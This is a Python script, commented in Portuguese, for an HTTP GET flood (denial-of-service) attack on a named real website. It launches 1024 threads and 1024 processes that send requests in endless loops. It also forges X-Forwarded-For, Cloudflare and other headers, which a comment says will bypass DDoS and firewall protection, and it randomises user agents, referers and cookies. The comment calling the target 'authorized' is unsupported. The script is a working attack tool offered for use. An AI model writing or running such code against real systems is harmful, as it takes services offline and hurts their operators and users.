import requests
from threading import Thread
from multiprocessing import Process
import random
import time
import string

# Função para gerar um cookie aleatório
def generate_random_cookie(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# Função para enviar requisições HTTP GET
def send_get_request(url, headers):
    while True:
        response = requests.get(url, headers=headers)
        print(f"Request sent to {url}, Response code: {response.status_code}")

# Função para enviar Flood HTTP GET usando Threads
def flood_with_threads(url, headers, num_threads):
    for _ in range(num_threads):
        thread = Thread(target=send_get_request, args=(url, headers))
        thread.start()

# Função para enviar Flood HTTP GET usando Multiprocessing
def flood_with_multiprocessing(url, headers, num_processes):
    for _ in range(num_processes):
        process = Process(target=send_get_request, args=(url, headers))
        process.start()

# URL do site autorizado
url = "https://ecoescolas.abaae.pt/"
# Carregar user agents de arquivo
with open("useragents.txt", "r") as f:
    user_agents = [line.strip() for line in f.readlines()]
# Carregar Referers de arquivo
with open("referers.txt", "r") as f:
    referers = [line.strip() for line in f.readlines()]

# Configurações
num_threads = 1024
num_processes = 1024
duration = 17014  # duração do ataque em segundos

# Gerar um cookie aleatório
random_cookie = generate_random_cookie(64)

# Headers com user agents e Referers aleatórios e autenticação de cookie randonizado
headers = {
    "User-Agent": random.choice(user_agents),
    "Referer": random.choice(referers),
    "Cookie": f"auth={random_cookie}",
    # Cabeçalhos Bypass para contornar a proteção avançada de DDoS/Firewalls/Cloudflare
    "X-Forwarded-For": "127.0.0.1",
    "X-Forwarded-Host": url,
    "X-Forwarded-Proto": "https",
    "X-Real-IP": "127.0.0.1",
    "X-Client-IP": "127.0.0.1",
    "CF-Connecting-IP": "127.0.0.1",
    "CF-IPCountry": "US",
    "CF-Visitor": "{\"scheme\":\"https\"}",
    "True-Client-IP": "127.0.0.1"
}

# Mensagem de início do ataque
print("Attack sent successfully!")

# Enviar Flood HTTP GET usando Threads
flood_with_threads(url, headers, num_threads)

# Enviar Flood HTTP GET usando Multiprocessing
flood_with_multiprocessing(url, headers, num_processes)

# Manter o ataque ativo durante a duração especificada
time.sleep(duration)
